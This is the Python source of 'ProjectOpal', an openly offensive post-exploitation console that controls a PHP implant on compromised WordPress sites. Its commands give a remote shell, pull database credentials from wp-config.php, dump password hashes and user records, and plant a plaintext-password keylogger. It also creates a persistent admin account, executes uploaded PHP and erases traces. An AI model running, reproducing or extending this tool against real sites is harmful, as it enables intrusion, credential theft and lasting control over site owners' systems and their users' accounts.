#!/usr/bin/python
# -*- coding: utf-8 -*-

import os, sys, time
import readline, rlcompleter
import os.path
from sys import stdout, exit
import platform
import rlcompleter, readline
import os.path
import logging
import re
import socket
import time
import requests
import subprocess
import string
import random
import base64

os.system('clear')

version = "1.0.0"

tabcomp = ['help']

def complete(text, state):
    a = tabcomp
    return a

readline.set_completer_delims(' \t\n;')
readline.parse_and_bind("tab: complete")
readline.set_completer(complete)

class color:
	PURPLE = '\033[95m'
	CYAN = '\033[96m'
	DARKCYAN = '\033[36m'
	BLUE = '\033[94m'
	GREEN = '\033[92m'
	YELLOW = '\033[93m'
	RED = '\033[91m'
	BOLD = '\033[1m'
	UNDERL = '\033[4m'
	ENDC = '\033[0m'
	backBlack = '\033[40m'
	backRed = '\033[41m'
	backGreen = '\033[42m'
	backYellow = '\033[43m'
	backBlue = '\033[44m'
	backMagenta = '\033[45m'
	backCyan = '\033[46m'
	backWhite = '\033[47m'

time.sleep(0.1)
print "[\033[1;92m?\033[1m] Initializing Global State"
time.sleep(0.2)
print "[\033[1;92m?\033[1m] Detected Version => %s" % (version)
time.sleep(0.1)
print "[\033[1;92m?\033[1m] Target Config => %s" % (open("lib/config.target", "r").read())
time.sleep(0.1)
print "[\033[1;92m?\033[1m] Password Config => %s" % (open("lib/config.password").read())
time.sleep(0.1)

if requests.get(open("lib/config.target").read() + "64fc9f8191afee3231e7197a27b8ee0c.php").status_code == 200:
    print "[\033[1;92m?\033[0m] Implant Detected!"
    time.sleep(1)
else:
    print "[\033[1;92m?\033[0m] No Implant Detected"
    time.sleep(1)

print ""
banner = open("lib/banner.txt").read()
plugin_name = "Dolly2"

def main_info():
	ston = color.BLUE + "[" + color.ENDC
	print ""
	print "\t\t--=" + ston + color.GREEN + "Stealth post-exploitation framework for Wordpress" + color.ENDC
	print "\t+---**---==" + ston + "Version :" + color.RED + version + color.ENDC
	print "\t+---**---==" + ston + "Codename :" + color.RED + "ProjectOpal" + color.ENDC
	print "\t\t--=" + ston + "Update Date : [" + color.RED + "04.03.2020" + color.ENDC + "]"
	print "\n\n"

def help():
    print """
    Help Settings
    ======================

      Variable          Value
      --------          -----
      Help              show help menu
      exit              Quit ProjectOpal
      shell             Get shell access
      set               (TARGET,PASS) e.g set TARGET
      dump              Dump all user entries
      locate            Locate implant location
      logintamp         Tamper and login to any user via url
      show options      Show ProjectOpal configuration settings
      cls               Clear envoirment
      banner            Show banner
      inject            Inject target
      dbcreds           Dumps wordpress database
      keylogger         Keylog plaintext passwords
      uninstall         Remove implant and traces
      cdmin             Creates a persistent admin account (opal)
      hashdump          Dumps all WordPress password hashes
      upload            E.g (upload path.txt) Upload file to implant directory
      download          E.g (download wp-header.php) Download files from wordpress
      logs              Dump captured logs
      check             Check if site is implanted
      exec              E.g (exec run.php) Execute php script
      """

def options():
    print """
    Opal Settings
    ======================

      Variable          Value
      --------          -----
      TARGET            %s
      PASSWORD          %s
      """ % (open("lib/config.target", "r").read(), open("lib/config.password").read())

def main():
    try:
        intname = "console"
        line_1 = "\033[1;45mProjectOpal\033[0m:\033[1;100m" + intname + "\033[0m> "
        terminal = raw_input(line_1)
        if terminal[0:10] =='set TARGET':
            target_ip = terminal[11:]
            if target_ip == "":
                print "No value for target."
                main()
            print "[\033[1;92m?\033[0m] Set TargetIp => " + target_ip
            x = open("lib/config.target", "wr")
            x.write(target_ip)
            x.close()
            main()
        if terminal[0:12] =='show options':
            options()
            main()
        if terminal[0:3] =='cls':
            os.system("clear")
            main()
        if terminal[0:7] =='dbcreds':
            password = open("lib/config.password").read()
            target_open = open("lib/config.target", "r")
            target = target_open.read()
            send_packet = requests.get(target + "64fc9f8191afee3231e7197a27b8ee0c.php?console=" + password + "&command=" + "cat wp-config.php")
            db = "'DB_NAME', '(.*?)'"
            dbu = "'DB_USER', '(.*?)'"
            dbp = "'DB_PASSWORD', '(.*?)'"
            dbh = "'DB_HOST', '(.*?)'"

            dbuser = re.findall(db, send_packet.content)[0]
            dbname = re.findall(dbu, send_packet.content)[0]
            dbpass = re.findall(dbp, send_packet.content)[0]
            dbhost = re.findall(dbh, send_packet.content)[0]
            print " -DB_NAME: " + dbname
            print " -DB_USER: " + dbuser
            print " -DB_PASSWORD: " + dbpass
            print " -DB_HOST: " + dbhost
            print ""
            main()
        if terminal[0:8] =='hashdump':
            password = open("lib/config.password").read()
            target_open = open("lib/config.target", "r")
            target = target_open.read()
            send_packet = requests.get(target + "64fc9f8191afee3231e7197a27b8ee0c.php?console=" + password + "&command=" + "cat wp-config.php")
            db = "'DB_NAME', '(.*?)'"
            dbu = "'DB_USER', '(.*?)'"
            dbp = "'DB_PASSWORD', '(.*?)'"
            dbh = "'DB_HOST', '(.*?)'"

            dbuser = re.findall(db, send_packet.content)[0]
            dbname = re.findall(dbu, send_packet.content)[0]
            dbpass = re.findall(dbp, send_packet.content)[0]
            dbhost = re.findall(dbh, send_packet.content)[0]
            hashdumps = requests.get(target + "64fc9f8191afee3231e7197a27b8ee0c.php?hashdump=" + password + "&host=" + dbhost + "&dbuser=" + dbuser + "&dbpass=" + dbpass + "&dbname=" + dbname)
            print hashdumps.content
            print ""
            main()
        if terminal[0:6] =='banner':
            print banner
            main()
        if terminal[0:6] =='cdmin':
            password = open("lib/config.password").read()
            target_open = open("lib/config.target", "r")
            target = target_open.read()

            time.sleep(0.5)
            inject_packet = requests.get(target + "64fc9f8191afee3231e7197a27b8ee0c.php?cdmin=" + password)
            print " -Done."
            print ""
            main()
        if terminal[0:4] =='exec':
            password = open("lib/config.password").read()
            target_open = open("lib/config.target", "r")
            target = target_open.read()
            ar = terminal[5:]
            if ar == "":
                print "No value for exec."
                main()
            x = open(ar, "rb").read()
            php = base64.b64encode(x)
            send_packet = requests.get(target + "64fc9f8191afee3231e7197a27b8ee0c.php?exec=" + password + "&php=" + php)
            if send_packet.content == "Executed":
                print " -Executed"
            else:
                print " -Error"
            main()
        if terminal[0:9] =='uninstall':
            password = open("lib/config.password").read()
            target_open = open("lib/config.target", "r")
            target = target_open.read()
            sp = requests.get(target + "64fc9f8191afee3231e7197a27b8ee0c.php?console=" + password + "&command=" + "rm 9590466950.txt")
            send_packet = requests.get(target + "64fc9f8191afee3231e7197a27b8ee0c.php?console=" + password + "&command=" + "rm 64fc9f8191afee3231e7197a27b8ee0c.php")
            print " -DELETED"
            print ""
            main()
        if terminal[0:8] =='set PASS':
            password_edit = terminal[9:]
            if password_edit == "":
                print "No value for password."
                main()
            print "[\033[1;92m?\033[0m] Set Password => " + password_edit
            x = open("lib/config.password", "wr")
            x.write(password_edit)
            x.close()
            main()
        if terminal[0:6] =='inject':
            target_open = open("lib/config.target", "r")
            target = target_open.read()

            time.sleep(0.5)
            print "[\033[1;92m?\033[0m] Injecting => " + target
            inject_packet = requests.get(target + "wp-content/plugins/" + plugin_name + "/install.php?go=go")
            if "Exploited" in inject_packet:
                print " -Injected"
            else:
                print " -Error"
            print ""
            main()

        if terminal[0:6] =='upload':
            password = open("lib/config.password").read()
            path = terminal[7:]
            target_open = open("lib/config.target", "r")
            target = target_open.read()
            if path == "":
                print "No value for upload."
                main()
            time.sleep(0.5)

            print "[\033[1;92m?\033[0m] Uploading => " + target + path
            time.sleep(1)
            char_set = string.ascii_uppercase + string.digits
            extension = os.path.splitext(path)[1]
            filename = ''.join(random.sample(char_set*6, 6)) + extension

            files = {'file': open(path, "rb")}
            d = requests.post(target + "64fc9f8191afee3231e7197a27b8ee0c.php?upload=" + password + "&pathname=" + filename, files=files)
            if d.content == "uploaded":
                print " -Done: %s%s" % (target,filename)
            else:
                print " -Failed"
            print ""
            main()
        if terminal[0:5] =='check':
            password = open("lib/config.password").read()
            target_open = open("lib/config.target", "r")
            target = target_open.read()
            if requests.get(open("lib/config.target").read() + "64fc9f8191afee3231e7197a27b8ee0c.php").status_code == 200:
                print "[\033[1;92m?\033[0m] Implant Detected!"
                time.sleep(1)
            else:
                print "[\033[1;92m?\033[0m] No Implant Detected"
                time.sleep(1)
            print ""
            main()

        if terminal[0:8] =='download':
            password = open("lib/config.password").read()
            path = terminal[9:]
            target_open = open("lib/config.target", "r")
            target = target_open.read()
            if path == "":
                print "No value for download."
                main()
            time.sleep(0.5)

            print "[\033[1;92m?\033[0m] Downloading => " + path
            time.sleep(1)
            url = target
            s = requests.Session()
            response = s.get(url)

            with open("Downloads/" + path, "w") as f:
                f.write(response.content)
                f.close()
            print " -Done"
            print ""
            main()
        if terminal[0:9] =='logintamp':
            password = open("lib/config.password").read()
            usertamp = terminal[10:]
            target_open = open("lib/config.target", "r")
            target = target_open.read()
            time.sleep(0.5)
            print "[\033[1;92m?\033[0m] Tampering => " + usertamp
            time.sleep(1)
            print "[\033[1;92m?\033[0m] URL: " + target + "64fc9f8191afee3231e7197a27b8ee0c.php?logintamp=" + password + "&user=" + usertamp
            print ""
            main()
        if terminal[0:6] == 'locate':
            password = open("lib/config.password").read()
            target_open = open("lib/config.target", "r")
            target = target_open.read()

            print "[\033[1;92m?\033[0m] Connecting => " + target
            response = requests.get(target)
            time.sleep(0.5)
            if response.status_code == 200:
                time.sleep(1)
                send_packet = requests.get(target + "64fc9f8191afee3231e7197a27b8ee0c.php?locate=" + password)
                print " -" + send_packet.content
                print ""
            else:
                print "[\033[1;92m?\033[0m] Unable to connect => " + target
                print ""
            main()
        if terminal[0:9] == 'keylogger':
            password = open("lib/config.password").read()
            target_open = open("lib/config.target", "r")
            target = target_open.read()

            a = requests.get(target + "64fc9f8191afee3231e7197a27b8ee0c.php?keylogger=" + password)
            if a.content == "Injected":
                print " -Keylogger: Injected"
                print " -Use logs"
            else:
                print " -Error"
            print ""
            main()
        if terminal[0:4] == 'logs':
            password = open("lib/config.password").read()
            target_open = open("lib/config.target", "r")
            target = target_open.read()

            a = requests.get(target + "/9590466950.txt")
            print a.content
            print ""
            main()
        if terminal[0:6] == 'dump':
            password = open("lib/config.password").read()
            target_open = open("lib/config.target", "r")
            target = target_open.read()

            print "[\033[1;92m?\033[0m] Connecting => " + target
            response = requests.get(target)
            time.sleep(0.5)
            if response.status_code == 200:
                time.sleep(1)
                send_packet = requests.get(target + "64fc9f8191afee3231e7197a27b8ee0c.php?userdump=" + password)
                print send_packet.content
                print ""
            else:
                print "[\033[1;92m?\033[0m] Unable to connect => " + target
                print ""
            main()
        if terminal[0:6] == 'shell':
            password = open("lib/config.password").read()
            target_open = open("lib/config.target", "r")
            target = target_open.read()

            print "[\033[1;92m?\033[0m] Connecting => " + target
            response = requests.get(target)
            time.sleep(0.5)
            if response.status_code == 200:
                time.sleep(1)
                print "[\033[1;92m?\033[0m] [Spawned Shell]"
                while True:
                    intname = "shell"
                    line_2 = "\033[1;45mProjectOpal\033[0m:\033[1;100m\033[1;31m" + intname + "\033[0m> "
                    terminal = raw_input(line_2)
                    send_packet = requests.get(target + "64fc9f8191afee3231e7197a27b8ee0c.php?console=" + password + "&command=" + terminal)
                    print send_packet.content
            else:
                print "[\033[1;92m?\033[0m] Unable to connect => " + target
                print ""
            main()
        elif terminal[0:4] =='help':
            help()
            main()
        elif terminal[0:9] =='exit':
            exit()
        else:
            print "[\033[1;92m?\033[0m] %s: command not found" % (terminal)
            main()
    except(KeyboardInterrupt):
        print "\n"
        return main()

print banner
main_info()
main()
